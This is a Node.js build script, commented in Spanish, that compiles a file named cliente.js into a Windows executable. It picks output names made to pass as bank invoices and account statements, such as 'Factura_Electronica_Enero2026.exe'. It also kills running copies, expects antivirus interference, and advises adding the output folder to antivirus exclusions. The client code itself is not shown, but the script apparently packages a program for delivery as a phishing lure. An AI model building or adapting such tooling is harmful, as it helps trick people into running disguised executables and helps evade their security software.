const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

const distDir = path.join(__dirname, 'dist');

// Ensure dist directory exists
if (!fs.existsSync(distDir)) {
    fs.mkdirSync(distDir, { recursive: true });
}

// Function to try to delete a file safely
function tryDelete(filename) {
    const filePath = path.join(distDir, filename);
    if (!fs.existsSync(filePath)) return true;
    try {
        fs.unlinkSync(filePath);
        return true;
    } catch (e) {
        return false;
    }
}

// Function to attempt build
function runBuild(filename) {
    console.log(`\n🔄 Intentando compilar a dist/${filename}...`);

    // 1. Clean up potential previous file
    if (!tryDelete(filename)) {
        console.log(`⚠️  No se pudo borrar ${filename} (Bloqueado/En uso). Saltando...`);
        return false;
    }

    // 2. Run pkg
    try {
        // Redirect stdio to inherit to see pkg output, but we also want to catch the error
        execSync(`pkg cliente.js --targets node18-win-x64 --output dist/${filename}`, { stdio: 'inherit' });
        console.log(`\n EXCELENTE! Compilacion exitosa en: dist/${filename}`);
        return true;
    } catch (e) {
        console.log(` Fallo la compilacion de ${filename}. (Probablemente bloqueado por Antivirus durante la escritura)`);
        return false;
    }
}

// Main logic
console.log(' Iniciando proceso de construccion inteligente...');

// Kill any stuck instances first
try {
    execSync('taskkill /F /IM cliente.exe', { stdio: 'ignore' });
} catch (e) { }

// List of preferred names to try in order (bank invoice style 2026)
const candidates = ['Factura_Electronica_Enero2026.exe', 'Estado_Cuenta_2026.exe', 'Comprobante_Bancario_2026.exe'];
let built = false;

// Try candidates
for (const name of candidates) {
    if (runBuild(name)) {
        built = true;
        break;
    }
}

// Fallback to timestamp if all else fails
if (!built) {
    const timestampName = `cliente_${Date.now()}.exe`;
    console.log(`\n⚠️  Nombres estandar bloqueados. Probando nombre unico: ${timestampName}`);
    if (runBuild(timestampName)) {
        built = true;
    }
}

if (!built) {
    console.error('\n💥 Todas las intentos de compilacion fallaron.');
    console.error('💡 SUGERENCIA: Agrega la carpeta "dist" a las exclusiones de tu Antivirus.');
    process.exit(1);
}
